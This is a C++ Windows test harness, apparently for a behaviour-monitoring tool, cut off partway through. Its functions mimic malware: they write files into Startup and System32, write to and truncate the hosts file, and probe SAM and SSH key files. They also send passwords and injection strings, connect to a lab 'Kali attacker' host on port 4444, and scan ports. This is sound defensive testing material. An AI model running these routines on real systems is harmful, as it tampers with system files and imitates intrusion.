

#include <ws2tcpip.h>
#include<windows.h>
#include<stdio.h>
#include <stdlib.h>
#include <iostream>
#define PAGE_SIZE	4096

#include <fstream> 
#include <direct.h>  // 用于 _mkdir
// 然后包含其他头文件
#include <string>
#include <vector>
#include <Lmcons.h> 
#include <cctype>
#include <random>
#include <algorithm>
#include <thread>
#include <chrono>
#include <cctype>   // 用于 toupper
#include <Lmcons.h> // 用于 UNLEN 和 GetUserNameW


#pragma comment(lib, "ws2_32.lib")  //加载 ws2_32.dll


using namespace std;
void showMenu();
void TestMaliciousFileReads();
void TestMaliciousWrites();
void TestMaliciousAttributes();
void TestMaliciousMoves();
void TestMaliciousCreateFileA();
void TestMaliciousSends();
void TestMaliciousSendTo();
void TestMaliciousRecv();
void TestMaliciousRecvFrom();
void TestMaliciousConnects();
void TestMaliciousWSAConnects();
void TestMaliciousSocketClose();
void TestMaliciousGetAddrInfo();
void TestMaliciousSocketCreation();
//---------------------------------
void CREATEPROCESSW();
void CREATETHREAD();
void EXITTHREAD();
void LOADLIBRARYEXA();
void GETPROCADDRESS();
void VIRTUALALLOCEX();
void WRITEPROCESSMEMORY();
//---------------------------------
void dangerousKeyLogging();
void suspiciousKeyStateLogging();
void simulateHotkeyRegistration();
void installSetWindowsHookExATest();
void testGetCursorPos();
void testSetCursorPos();
void testVirtualFree();
void testNtReadVirtualMemory();
int main() {
	int op = 0;
	while (1) {
		showMenu();
		scanf_s("%d", &op);
		switch (op)
		{
			// exit
		case 0: {
			printf("bye!\n");
			break;
		}
		case 999: {
			MessageBoxA(NULL, "I'm MessageBoxA", "I'm title", MB_OK);
			break;
		}
		case 1: {
			TestMaliciousFileReads();
			break;
		}
		case 2: {
			TestMaliciousWrites();
			break;
		}
		case 3: {
			TestMaliciousAttributes();
			break;
		}
		case 4: {
			TestMaliciousMoves();
			break;
		}
		case 5: {
			TestMaliciousCreateFileA();
			break;
		}
		case 6: {
			TestMaliciousSends();
			break;
		}
		case 7: {
			TestMaliciousSendTo();
			break;
		}
		case 8: {
			TestMaliciousRecv();
			break;
		}
		case 9: {
			TestMaliciousRecvFrom();
			break;
		}
		case 10: {
			TestMaliciousConnects();
			break;
		}
		case 11: {
			TestMaliciousWSAConnects();
			break;
		}
		case 12: {
			TestMaliciousGetAddrInfo();
			break;
		}
		case 13: {
			TestMaliciousSocketCreation();
			break;
		}
		case 14: {
			TestMaliciousSocketClose();
			break;
		}
		case 101: {
			CREATEPROCESSW();
			break;
		}
		case 102: {
			CREATETHREAD();
			break;
		}
		case 103: {
			EXITTHREAD();
			break;
		}
		case 104: {
			LOADLIBRARYEXA();
			break;
		}
		case 105: {
			GETPROCADDRESS();
			break;
		}
		case 106: {
			VIRTUALALLOCEX();
			break;
		}
		case 107: {
			WRITEPROCESSMEMORY();
			break;
		}
		
		case 201: {
			for (int i = 0; i < 10; i++) {
				dangerousKeyLogging();
				Sleep(1000);
			}
			break;
		}
		case 202: {
			for (int i = 0; i < 10; i++) {
				suspiciousKeyStateLogging();
				Sleep(1000);
			}
			break;
		}
		case 203: {
			simulateHotkeyRegistration();
			break;
		}
		case 204: {
			installSetWindowsHookExATest();
			break;
		}
		case 205: {
			testGetCursorPos();
			break;
		}
		case 206: {
			testSetCursorPos();
			break;
		}
		case 207: {
			testVirtualFree();
			break;
		}
		case 208: {
			testNtReadVirtualMemory();
			break;
		}

		}
		// exit
		if (op == 0) {
			break;
		}
	}
	return 0;
}
void showMenu() {
	//printf("\n*************************************************************************************\n");
	printf("--------------------------------please select an option--------------------------------\n");
	printf("\n");

	printf("--------------------------------文件操作监控、网络行为监控--------------------------------\n");
	printf("\n");
	printf("1. TestMaliciousFileReads    2. TestMaliciousWrites    3. TestMaliciousAttributes    4. TestMaliciousMoves\n");
	printf("5. TestMaliciousCreateFileA    6. TestMaliciousSends    7. TestMaliciousSendTo    8. TestMaliciousRecv\n");
	printf("9. TestMaliciousRecvFrom    10. TestMaliciousConnects    11. TestMaliciousWSAConnects    12. TestMaliciousGetAddrInfo\n");
	printf("13. TestMaliciousSocketCreation    14. TestMaliciousSocketClose\n");
	printf("\n");

	printf("--------------------------------进程线程行为监控、窗口行为监控--------------------------------\n");
	printf("\n");
	printf("101. CREATEPROCESSW    102. CREATETHREAD    103. EXITTHREAD    104. LOADLIBRARYEXA\n");
	printf("105. GETPROCADDRESS    106. VIRTUALALLOCEX    107. WRITEPROCESSMEMORY\n");
	printf("\n");

	printf("--------------------------------键盘鼠标行为监控、内存资源监控--------------------------------\n");
	printf("\n");
	printf("201.dangerousKeyLogging    202. suspiciousKeyStateLogging    203. simulateHotkeyRegistration    204. installSetWindowsHookExATest\n");
	printf("205. testGetCursorPos    206. testSetCursorPos    207. testVirtualFree    208. testNtReadVirtualMemory\n");
	printf("\n");
	printf("输入序号，选择一个测试函数：\n");
	printf("\n");

}

/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------王博---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/


void TestMaliciousFileReads() {
	// 1. 确保临时目录和文件存在
	_mkdir("D:\\test");  // 创建目录（如果不存在）
	std::ofstream tmpFile("D:\\test\\testfile.txt");
	if (tmpFile) {
		tmpFile << "Test content";
		tmpFile.close();
	}
	else {
		std::cerr << "[ERROR] Failed to create D:\\test\\testfile.txt\n";
	}

	// 2. 测试路径列表（替换为可访问的路径）
	std::vector<std::string> testPaths = {
		"C:\\Windows\\System32\\drivers\\etc\\hosts",  // 通常可读
		"D:\\test\\testfile.txt",                     // 临时文件
		"C:\\Windows\\win.ini",                       // 替代公共目录文件
		// "\\\\NAS\\real_share\\file.ini"            // 仅当网络路径存在时启用
	};

	// 3. 遍历测试路径
	for (const auto& path : testPaths) {
		HANDLE hFile = CreateFileA(
			path.c_str(),
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			BYTE buffer[1024];
			DWORD bytesRead;
			if (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
				std::cout << "[SUCCESS] Read " << bytesRead << " bytes from: " << path << "\n";
			}
			else {
				std::cerr << "[ERROR] Read failed: " << path << " (Error: " << GetLastError() << ")\n";
			}
			CloseHandle(hFile);
		}
		else {
			DWORD err = GetLastError();
			std::cerr << "[FAILED] Open failed: " << path << " (Error: " << err << ")\n";
		}
	}
}

// 检查驱动器是否存在
bool IsDriveAvailable(char driveLetter) {
	driveLetter = toupper(driveLetter);
	DWORD drives = GetLogicalDrives();
	return (drives & (1 << (driveLetter - 'A')));
}

// 创建目录（如果不存在）
void EnsureDirectoryExists(const std::string& path) {
	size_t pos = path.find_last_of("\\/");
	if (pos != std::string::npos) {
		std::string dir = path.substr(0, pos);
		_mkdir(dir.c_str()); // 忽略错误（可能已存在）
	}
}
//恶意写入测试
void TestMaliciousWrites() {
	// 测试路径列表（优化后的路径）
	std::vector<std::string> testPaths = {
		// 1. 可执行文件（仅用可写目录）
		"C:\\Temp\\malware.exe",
		"C:\\Temp\\payload.dll",

		// 2. 系统路径（保留需管理员权限的路径以测试防护）
		"C:\\Windows\\Tasks\\schedule.bat", // 通常可写
		"C:\\Windows\\System32\\drivers\\rogue.sys", // 触发权限检测

		// 3. 启动目录（使用当前用户的路径）
		"C:\\Users\\" + std::string(getenv("USERNAME")) +
		"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.vbs",

		// 4. 配置文件和临时文件
		"C:\\ProgramData\\app_config.ini",
		"C:\\Temp\\file1.tmp",
		"C:\\Users\\Public\\Documents\\report.txt"
	};

	for (const auto& path : testPaths) {
		// 跳过不存在的驱动器
		if (path.size() > 1 && path[1] == ':' && !IsDriveAvailable(path[0])) {
			std::cerr << "[SKIPPED] Drive not found: " << path << "\n";
			continue;
		}

		// 确保目录存在
		EnsureDirectoryExists(path);

		HANDLE hFile = CreateFileA(
			path.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			const char* testData = "Test data for malicious write";
			DWORD bytesWritten;
			if (WriteFile(hFile, testData, strlen(testData), &bytesWritten, NULL)) {
				std::cout << "[SUCCESS] Wrote " << bytesWritten << " bytes to: " << path << "\n";
			}
			else {
				std::cerr << "[ERROR] Write failed: " << path << " (Error: " << GetLastError() << ")\n";
			}
			CloseHandle(hFile);
		}
		else {
			DWORD err = GetLastError();
			std::cerr << "[ERROR] Failed to create file: " << path << " (Error: " << err << ")\n";
		}
	}
}

#include <Lmcons.h> // 用于 UNLEN 和 GetUserNameW


// 获取当前用户名
std::wstring GetCurrentUsername() {
	wchar_t username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameW(username, &username_len);
	return username;
}

// 检查驱动器是否存在
bool IsDriveAvailable(wchar_t driveLetter) {
	driveLetter = towupper(driveLetter);
	DWORD drives = GetLogicalDrives();
	return (drives & (1 << (driveLetter - L'A')));
}

void TestMaliciousAttributes() {
	// 获取当前用户名
	std::wstring currentUser = GetCurrentUsername();

	// 测试路径列表（动态替换用户名和检查路径）
	std::vector<std::wstring> testPaths = {
		// 1. 系统关键目录
		L"C:\\Windows\\System32",
		L"C:\\Windows\\SysWOW64",  // 修正 SysMOM64 为 SysWOW64
		L"C:\\Windows\\System",

		// 2. 注册表文件（保留以测试权限）
		L"C:\\Windows\\System32\\config\\SAM",
		L"C:\\Windows\\System32\\config\\SYSTEM",
		L"C:\\Windows\\System32\\config\\SECURITY",
		L"C:\\Users\\" + currentUser + L"\\NTUSER.DAT",  // 使用当前用户

		// 3. 隐藏/临时文件（确保路径存在）
		L"C:\\Users\\" + currentUser + L"\\AppData\\Local\\Temp\\hidden_file.tmp",
		L"C:\\ProgramData\\Microsoft\\Windows\\HiddenFolder\\config.ini",  // 需提前创建
		L"C:\\Users\\" + currentUser + L"\\.ssh\\id_rsa",  // 完整路径

		// 4. 可执行文件
		//L"C:\\Windows\\System32\\cmd.exe",
		L"C:\\Windows\\System32\\kernel32.dll",
		L"C:\\Windows\\System32\\drivers\\ntfs.sys",  // 修正 ntf-sys 为 ntfs.sys

		// 5. 正常文件（仅保留存在的驱动器）
		L"C:\\Users\\Public\\Documents\\report.txt",
		// L"D:\\data\\backup.zip",  // 动态检查后启用
		// L"E:\\archive\\logs.log"  // 动态检查后启用
	};

	// 动态添加存在的驱动器路径
	if (IsDriveAvailable(L'D')) {
		testPaths.push_back(L"D:\\data\\backup.zip");
	}
	if (IsDriveAvailable(L'E')) {
		testPaths.push_back(L"E:\\archive\\logs.log");
	}

	// 测试访问文件属性
	for (const auto& path : testPaths) {
		// 跳过不存在的路径（如 HiddenFolder）
		DWORD attrs = GetFileAttributesW(path.c_str());
		if (attrs == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
			std::wcerr << L"[SKIPPED] Path not found: " << path << L"\n";
			continue;
		}

		// 重新获取属性以检查权限
		attrs = GetFileAttributesW(path.c_str());
		if (attrs != INVALID_FILE_ATTRIBUTES) {
			std::wcout << L"[SUCCESS] Accessed attributes of: " << path << L"\n";
			std::wcout << L"Attributes: ";

			if (attrs & FILE_ATTRIBUTE_DIRECTORY) std::wcout << L"DIRECTORY ";
			if (attrs & FILE_ATTRIBUTE_ARCHIVE) std::wcout << L"ARCHIVE ";
			if (attrs & FILE_ATTRIBUTE_HIDDEN) std::wcout << L"HIDDEN ";
			if (attrs & FILE_ATTRIBUTE_SYSTEM) std::wcout << L"SYSTEM ";
			if (attrs & FILE_ATTRIBUTE_READONLY) std::wcout << L"READONLY ";
			std::wcout << L"\n";
		}
		else {
			DWORD err = GetLastError();
			std::wcerr << L"[ERROR] Failed to access: " << path
				<< L" (Error: " << err << L")\n";
		}
	}
}

// 恶意文件移动测试函数
void TestMaliciousMoves()
{
	// 获取当前用户名
	std::wstring username = GetCurrentUsername();

	// 创建测试路径
	std::vector<std::pair<std::wstring, std::wstring>> testMoves = {
		// 1. 移动系统文件
		//{L"C:\\Windows\\System32\\drivers\\etc\\hosts", L"C:\\Temp\\hosts.bak"},
		//{L"C:\\Windows\\System32\\cmd.exe", L"D:\\Backup\\cmd_copy.exe"},

		// 2. 移动到敏感目录
		{L"C:\\Temp\\config.ini", L"C:\\Windows\\System32\\config.ini"},
		{L"D:\\Downloads\\payload.dll", L"C:\\Program Files\\Common Files\\payload.dll"},
		{L"E:\\malware.exe", L"C:\\Users\\" + username + L"\\AppData\\Roaming\\malware.exe"},

		// 3. 移动到启动目录
		{L"C:\\Temp\\startup.vbs", L"C:\\Users\\" + username + L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.vbs"},
		{L"D:\\autorun.ps1", L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\autorun.ps1"},

		// 4. 重命名为可执行文件
		{L"C:\\Users\\Public\\Documents\\data.txt", L"C:\\Users\\Public\\Documents\\data.exe"},
		{L"D:\\logs\\system.log", L"E:\\system\\winlogon.exe"},

		// 5. 重命名为隐藏文件
		{L"C:\\Temp\\secret.txt", L"C:\\Temp\\.hidden_secret"},
		{L"D:\\credentials.dat", L"E:\\$hidden\\credentials.dat"},

		// 6. 多次移动操作（快速连续）
		{L"C:\\Temp\\file1.tmp", L"C:\\Temp\\file1_moved.tmp"},
		{L"C:\\Temp\\file2.tmp", L"C:\\Temp\\file2_moved.tmp"},
		{L"C:\\Temp\\file3.tmp", L"C:\\Temp\\file3_moved.tmp"},
		{L"C:\\Temp\\file4.tmp", L"C:\\Temp\\file4_moved.tmp"},
		{L"C:\\Temp\\file5.tmp", L"C:\\Temp\\file5_moved.tmp"},

		// 7. 普通移动操作
		{L"C:\\Users\\Public\\Downloads\\document.docx", L"D:\\Archive\\document.docx"},
		{L"E:\\old_logs\\app.log", L"E:\\archive\\logs\\app.log"}
	};

	// 创建测试文件
	for (const auto& movePair : testMoves) {
		// 创建源文件
		HANDLE hFile = CreateFileW(
			movePair.first.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			const char* data = "Test file content";
			DWORD bytesWritten;
			WriteFile(hFile, data, strlen(data), &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}

	// 执行移动操作
	for (const auto& movePair : testMoves) {
		if (MoveFileW(movePair.first.c_str(), movePair.second.c_str())) {
			std::wcout << L"[SUCCESS] Moved: " << movePair.first
				<< L" -> " << movePair.second << L"\n";
		}
		else {
			DWORD err = GetLastError();
			std::wcerr << L"[ERROR] Failed to move: " << movePair.first
				<< L" -> " << movePair.second
				<< L" (Error: " << err << L")\n";
		}

		// 对于快速移动测试，添加延迟以避免一次性完成
		if (movePair.first.find(L"file1.tmp") != std::wstring::npos) {
			Sleep(100); // 100ms 延迟
		}
	}
}

// 恶意文件操作测试函数
void TestMaliciousCreateFileA()
{
	// 测试用例设计
	struct TestCase {
		std::string path;
		DWORD access;
		DWORD creation;
		std::string description;
	};

	std::vector<TestCase> testCases = {
		// 1. 尝试写入系统文件
		{"C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_WRITE, OPEN_EXISTING, "Write to system hosts file"},

		// 2. 尝试覆盖系统文件
		{"C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate system hosts file"},

		// 3. 创建新系统文件
		{"C:\\Windows\\System32\\malicious.dll", GENERIC_WRITE, CREATE_ALWAYS, "Create new DLL in system32"},

		// 4. 尝试覆盖用户文档
		{"C:\\Users\\Public\\Documents\\important.doc", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate user document"},

		// 5. 创建启动项
		{"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.exe", GENERIC_WRITE, CREATE_ALWAYS, "Create startup executable"},

		// 6. 尝试覆盖配置文件
		{"C:\\Program Files\\Common Files\\config.ini", GENERIC_WRITE, CREATE_ALWAYS, "Overwrite configuration file"},

		// 7. 创建临时文件（正常操作）
		{"C:\\Temp\\test.tmp", GENERIC_WRITE, CREATE_ALWAYS, "Create temporary file"},

		// 8. 只读访问系统文件（不应触发写警告）
		{"C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, OPEN_EXISTING, "Read system DLL"},

		// 9. 以TRUNCATE_EXISTING方式打开普通文件
		{"D:\\data\\log.txt", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate log file"},

		// 10. 创建隐藏文件
		{"C:\\Users\\Public\\hidden.dat", GENERIC_WRITE, CREATE_ALWAYS, "Create hidden file"}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		HANDLE hFile = CreateFileA(
			test.path.c_str(),
			test.access,
			FILE_SHARE_READ,
			NULL,
			test.creation,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			std::cout << "  [SUCCESS] File opened/created: " << test.path << "\n";

			// 如果是写操作，尝试写入数据
			if (test.access & (GENERIC_WRITE | GENERIC_ALL)) {
				const char* data = "Malicious data";
				DWORD bytesWritten;

				if (WriteFile(hFile, data, strlen(data), &bytesWritten, NULL)) {
					std::cout << "  [SUCCESS] Wrote " << bytesWritten << " bytes\n";
				}
				else {
					std::cerr << "  [ERROR] Write failed: " << GetLastError() << "\n";
				}
			}

			CloseHandle(hFile);
		}
		else {
			std::cerr << "  [ERROR] Failed to open/create: " << test.path
				<< " (Error: " << GetLastError() << ")\n";
		}

		std::cout << "----------------------------------------\n";
	}
}

// 生成随机数据包
std::string GenerateRandomData(size_t length) {
	std::string random_data;
	random_data.reserve(length);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(32, 126); // 可打印ASCII字符

	for (size_t i = 0; i < length; ++i) {
		random_data.push_back(static_cast<char>(dis(gen)));
	}

	return random_data;
}

// 恶意网络发送测试函数
void TestMaliciousSends()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 创建TCP套接字
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// 设置目标地址（本地回环地址）
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(80); // HTTP端口
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	// 尝试连接（即使连接失败，我们仍能测试send函数）
	connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));

	// 测试用例设计
	struct TestCase {
		std::string data;
		std::string description;
		bool expectKeywordWarning;
		bool expectSizeWarning;
	};

	std::vector<TestCase> testCases = {
		// 1. 明文密码传输
		{"username=admin&password=Secret123!", "Plaintext password", true, false},

		// 2. API密钥传输
		{"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "API token", true, false},

		// 3. 命令注入尝试
		{"|echo 'malicious' > /tmp/exploit", "Command injection", true, false},

		// 4. SQL注入尝试
		{"' OR 1=1;--", "SQL injection", true, false},

		// 5. 大文件传输
		{GenerateRandomData(2048), "Large payload (2KB)", false, true},

		// 6. 超大文件传输
		{GenerateRandomData(10240), "Very large payload (10KB)", false, true},

		// 7. 混合敏感数据和大尺寸
		{"password=Secret123&data=" + GenerateRandomData(1500), "Mixed sensitive and large", true, true},

		// 8. 二进制数据（可能包含敏感信息）
		{std::string(100, '\0') + "password" + std::string(100, '\xFF'), "Binary data with keyword", true, false},

		// 9. 正常数据
		{"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n", "Normal HTTP request", false, false},

		// 10. 加密数据（模拟）
		{"U2FsdGVkX1+Wv2f8u3C5f7XbZaY7hD1kKjLpMnOpQqw=", "Encrypted data", false, false}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		// 发送数据
		int bytesSent = send(sock, test.data.c_str(), static_cast<int>(test.data.size()), 0);

		if (bytesSent == SOCKET_ERROR) {
			std::cerr << "  [ERROR] Send failed: " << WSAGetLastError() << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Sent " << bytesSent << " bytes\n";

			// 检查预期警告
			std::cout << "  Expected warnings: ";
			if (test.expectKeywordWarning) std::cout << "Keyword ";
			if (test.expectSizeWarning) std::cout << "Size ";
			if (!test.expectKeywordWarning && !test.expectSizeWarning) std::cout << "None";
			std::cout << "\n";
		}

		std::cout << "----------------------------------------\n";
	}

	// 清理
	closesocket(sock);
	WSACleanup();
}

// 恶意网络发送测试函数 (UDP)
void TestMaliciousSendTo()
{
	// 初始化Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 创建UDP套接字
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// 设置目标地址（本地回环地址）
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(0); // 动态端口
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	// 测试用例设计
	struct TestCase {
		std::string data;
		std::string description;
		bool expectKeywordWarning;
		bool expectPortScanWarning;
	};

	std::vector<TestCase> testCases = {
		// 1. 敏感数据（密码）
		{"username=admin&password=P@ssw0rd123", "Sensitive data (password)", true, false},

		// 2. API密钥传输
		{"API_KEY: 7d5f8a3b-9c1e-4f2a-8d3c-6b5a9e1f0d7a", "API key transmission", true, false},

		// 3. 小数据包（可能端口扫描）
		{"PING", "Small UDP packet (possible port scan)", false, true},

		// 4. 多个小数据包（端口扫描）
		{"SCAN", "Multiple small packets (port scan simulation)", false, true},

		// 5. 加密数据（模拟）
		{"U2FsdGVkX1+Wv2f8u3C5f7XbZaY7hD1kKjLpMnOpQqw=", "Encrypted data", false, false},

		// 6. DNS查询（正常UDP流量）
		{"\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01",
		 "DNS query", false, false},


	};

	// 端口扫描模拟
	std::vector<int> portsToScan = { 80, 443, 53, 22, 3389, 8080, 21, 25, 110, 143 };

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		// 设置目标端口
		int port = test.description.find("port scan") != std::string::npos ?
			portsToScan[rand() % portsToScan.size()] : 12345;
		serverAddr.sin_port = htons(port);

		// 发送数据
		int bytesSent = sendto(
			sock,
			test.data.c_str(),
			static_cast<int>(test.data.size()),
			0,
			(sockaddr*)&serverAddr,
			sizeof(serverAddr)
		);

		if (bytesSent == SOCKET_ERROR) {
			std::cerr << "  [ERROR] Sendto failed: " << WSAGetLastError() << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Sent " << bytesSent << " bytes to port " << port << "\n";

			// 检查预期警告
			std::cout << "  Expected warnings: ";
			if (test.expectKeywordWarning) std::cout << "Keyword ";
			if (test.expectPortScanWarning) std::cout << "PortScan ";
			if (!test.expectKeywordWarning && !test.expectPortScanWarning) std::cout << "None";
			std::cout << "\n";
		}

		// 对于端口扫描测试，发送多个小包
		if (test.description.find("Multiple") != std::string::npos) {
			for (int port : portsToScan) {
				serverAddr.sin_port = htons(port);
				std::string scanPacket = "SCAN:" + std::to_string(port);

				sendto(
					sock,
					scanPacket.c_str(),
					static_cast<int>(scanPacket.size()),
					0,
					(sockaddr*)&serverAddr,
					sizeof(serverAddr)
				);

				std::cout << "  [SCAN] Sent scan packet to port " << port << "\n";
				std::this_thread::sleep_for(std::chrono::milliseconds(10));
			}
		}

		std::cout << "----------------------------------------\n";
	}

	// 清理
	closesocket(sock);
	WSACleanup();
}

void TestMaliciousRecv()
{
	// 初始化 Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 创建客户端套接字
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (clientSocket == INVALID_SOCKET) {
		std::cerr << "Client socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// 连接 Kali 攻击者主机
	sockaddr_in kaliAddr;
	kaliAddr.sin_family = AF_INET;
	kaliAddr.sin_port = htons(4444);  // 攻击者监听的端口
	inet_pton(AF_INET, "192.168.10.128", &kaliAddr.sin_addr);  // 攻击者 IP

	if (connect(clientSocket, (sockaddr*)&kaliAddr, sizeof(kaliAddr)) == SOCKET_ERROR) {
		std::cerr << "Connect to Kali failed: " << WSAGetLastError() << "\n";
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	std::cout << "[+] Connected to Kali server.\n";

	// 模拟接收数据
	char buffer[15000]; // 15KB 缓冲区
	int totalReceived = 0;

	while (true) {
		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		if (bytesReceived == SOCKET_ERROR) {
			std::cerr << "Recv failed: " << WSAGetLastError() << "\n";
			break;
		}

		if (bytesReceived == 0) {
			std::cout << "Connection closed by server\n";
			break;
		}

		totalReceived += bytesReceived;
		std::cout << "[+] Received " << bytesReceived << " bytes (total: " << totalReceived << ")\n";

		// 打印前100字节
		std::string preview(buffer, bytesReceived < 100 ? bytesReceived : 100);
		for (auto& c : preview) {
			if (!std::isprint(static_cast<unsigned char>(c))) {
				c = '.';
			}
		}
		std::cout << "Preview: " << preview << "\n";
	}

	closesocket(clientSocket);
	WSACleanup();
}

void TestMaliciousRecvFrom()
{
	// 初始化 Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// 创建 UDP 套接字
	SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (udpSocket == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// 绑定到本地4444端口
	sockaddr_in localAddr;
	localAddr.sin_family = AF_INET;
	localAddr.sin_port = htons(4444);        // 明确绑定到4444端口
	localAddr.sin_addr.s_addr = htonl(INADDR_ANY);  // 接收所有网络接口的连接

	if (bind(udpSocket, (sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
		std::cerr << "Bind failed: " << WSAGetLastError() << "\n";
		closesocket(udpSocket);
		WSACleanup();
		return;
	}

	// Kali 攻击服务器地址
	sockaddr_in kaliAddr;
	kaliAddr.sin_family = AF_INET;
	kaliAddr.sin_port = htons(5555);  // Kali 监听的UDP端口
	inet_pton(AF_INET, "192.168.10.128", &kaliAddr.sin_addr);

	// 向 Kali 发送握手或请求
	const char* hello = "HELLO_FROM_VICTIM";
	sendto(udpSocket, hello, (int)strlen(hello), 0,
		(sockaddr*)&kaliAddr, sizeof(kaliAddr));
	std::cout << "[+] Sent handshake to Kali.\n";

	// 开始接收数据（模拟触发 recvfrom hook）
	char buffer[15000];
	sockaddr_in fromAddr;
	int fromLen = sizeof(fromAddr);
	int totalReceived = 0;

	for (int i = 0; i < 8; i++) {  // 接收最多8个数据包
		int bytesReceived = recvfrom(
			udpSocket,
			buffer,
			sizeof(buffer),
			0,
			(sockaddr*)&fromAddr,
			&fromLen
		);

		if (bytesReceived == SOCKET_ERROR) {
			std::cerr << "Recvfrom failed: " << WSAGetLastError() << "\n";
			break;
		}

		totalReceived += bytesReceived;

		// 打印来源地址
		char senderIP[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &fromAddr.sin_addr, senderIP, INET_ADDRSTRLEN);
		int senderPort = ntohs(fromAddr.sin_port);

		std::cout << "Received " << bytesReceived << " bytes from "
			<< senderIP << ":" << senderPort
			<< " (total: " << totalReceived << ")\n";

		// 打印前100字节内容
		std::string preview(buffer, bytesReceived < 100 ? bytesReceived : 100);
		for (auto& c : preview) {
			if (!std::isprint(static_cast<unsigned char>(c))) c = '.';
		}
		std::cout << "Preview: " << preview << "\n";

		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}

	closesocket(udpSocket);
	WSACleanup();
}

void TestMaliciousConnects()
{
	// 初始化 Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// Kali 服务器地址
	std::string kaliIP = "192.168.10.128";

	// 要测试的端口列表
	std::vector<int> ports = {
		22,     // SSH
		23,     // Telnet
		21,     // FTP
		445,    // SMB
		3389,   // RDP
		139,    // NetBIOS
		5900,   // VNC
		3306,   // MySQL
		53,     // DNS
		8080    // HTTP proxy/服务
	};

	for (int port : ports) {
		std::cout << "Testing connection to " << kaliIP << ":" << port << "\n";

		// 创建 TCP 套接字
		SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == INVALID_SOCKET) {
			std::cerr << "  [ERROR] Socket creation failed: " << WSAGetLastError() << "\n";
			continue;
		}

		// 设置目标地址
		sockaddr_in targetAddr;
		targetAddr.sin_family = AF_INET;
		targetAddr.sin_port = htons(port);
		inet_pton(AF_INET, kaliIP.c_str(), &targetAddr.sin_addr);

		// 连接尝试
